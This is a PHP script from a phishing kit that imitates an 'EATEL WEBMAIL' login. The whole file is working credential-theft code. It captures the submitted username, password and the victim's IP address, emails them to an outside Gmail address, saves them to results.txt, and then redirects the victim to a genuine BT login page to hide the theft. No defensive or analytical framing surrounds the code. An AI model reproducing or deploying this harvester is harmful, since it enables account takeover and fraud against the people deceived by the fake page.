<?php

session_start();
include'ip.php';
$ip = MDgetIp();

$_SESSION['username'] = $_POST['USER']."\n";
$_SESSION['password'] = $_POST['NAFMPASSWORD']."\n";

if($_SESSION['username']==is_null($_SESSION['username']) || $_SESSION['password']==is_null($_SESSION['password'])){
	
	
header("Location:index.html");
	
	
	
}

else{



$message .= "=======||Login||======<br>\n";
$message .= "IP ADDRESS	: ".$ip."<br>\n";
$message .= "username: ".$_SESSION['username']."<br>\n";
$message .= "password	: ".$_SESSION['password']."<br>\n";
$message .= "-------------------------------------------\n";


$to = "jamesmccurry40@gmail.com";
$subject = "[EATEL WEBMAIL] LOGIN RESULTS";
$headers = "From: ANonyMOUS Guru";
$headers ="MIME-Version: 1.0 \r\n";
$headers ="Content-type: text/html \r\n";

mail($to,$subject,$message,$headers);

$file = fopen("results.txt", "w") or die("can't open file");
fwrite($file, $message);
fclose($file);

header("Location:https://home.bt.com/login/loginform?TARGET=$SM$https%3A%2F%2Fsignin1.bt.com%2Fbtmail%2Fsecure%2Femaillogin");
	
}
?>
